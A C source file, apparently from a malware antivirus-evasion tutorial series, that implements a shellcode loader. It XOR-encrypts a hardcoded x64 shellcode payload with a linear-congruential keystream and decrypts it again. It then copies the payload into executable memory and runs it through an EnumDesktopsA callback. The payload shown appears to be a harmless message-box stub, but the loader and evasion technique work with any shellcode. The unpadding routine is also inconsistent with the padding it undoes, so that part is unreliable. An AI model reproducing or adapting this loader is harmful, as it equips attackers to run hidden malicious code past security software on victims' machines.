/*
 * hack.c
 * modular multiplication based block cipher (stream cipher)
 * author: @cocomelonc
 * https://cocomelonc.github.io/malware/2023/06/26/malware-av-evasion-18.html
*/
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

// change these to your own keys
#define MULTIPLIER 0x12345
#define INCREMENT  0x6789

uint32_t state = 0;

void seed(uint32_t seed_value) {
  state = seed_value;
}

uint32_t next_random() {
  // the modulus is 2^32, since we're using a uint32_t
  state = (MULTIPLIER * state + INCREMENT);
  return state;
}

// padding
unsigned char* pkcs7_pad(unsigned char* data, size_t len, size_t block_size, size_t *new_len) {
  size_t padding = block_size - len % block_size;
  unsigned char* padded_data = (unsigned char*)malloc(len + padding);
  memcpy(padded_data, data, len);

  for(size_t i = len; i < len + padding; ++i) {
    padded_data[i] = padding;
  }

  *new_len = len + padding;
  return padded_data;
}

unsigned char* pad_data(unsigned char* data, size_t len, size_t block_size, size_t *new_len) {
  size_t padding = block_size - len % block_size;
  unsigned char* padded_data = (unsigned char*)malloc(len + padding);
  memcpy(padded_data, data, len);

  for(size_t i = len; i < len + padding; ++i) {
    padded_data[i] = 0x90; // padding with 0x90
  }

  *new_len = len + padding;
  return padded_data;
}

void unpad_data(unsigned char* data, size_t *len) {
  size_t padding = data[*len - 1]; // last byte is the padding length
  *len -= padding + 1; // adjust length to remove padding and padding length byte
}

void mmb_encrypt(unsigned char *data, size_t len) {
  for(size_t i = 0; i < len; ++i) {
    // encrypt one byte at a time
    uint32_t rand = next_random();
    data[i] ^= (rand & 0xFF); // only use the least significant byte
  }
}

void mmb_decrypt(unsigned char *data, size_t len) {
  // decryption is the same as encryption for this cipher
  mmb_encrypt(data, len);
}

int main() {
  unsigned char my_payload[] = 
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

  int my_payload_len = sizeof(my_payload);
  size_t pad_len;

  seed(12345); // seed the PRNG

  printf("original shellcode: ");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", my_payload[i]);
  }
  printf("\n\n");

  // unsigned char* padded = pkcs7_pad(my_payload, my_payload_len - 1, 16, &pad_len);
  unsigned char* padded = pad_data(my_payload, my_payload_len - 1, 16, &pad_len);

  printf("padded shellcode: ");
  for (int i = 0; i < pad_len; i++) {
    printf("%02x ", padded[i]);
  }
  printf("\n\n");

  mmb_encrypt(padded, pad_len);
  
  printf("encrypted shellcode: ");
  for (int i = 0; i < pad_len; i++) {
    printf("%02x ", padded[i]);
  }
  printf("\n\n");

  seed(12345); // reset the PRNG to the same state
  mmb_decrypt(padded, pad_len);

  printf("decrypted shellcode: ");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", padded[i]);
  }

  printf("\n\n");
  unpad_data(padded, &pad_len); // unpad the data

  LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, padded, my_payload_len);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);

  free(padded);
  return 0;
}

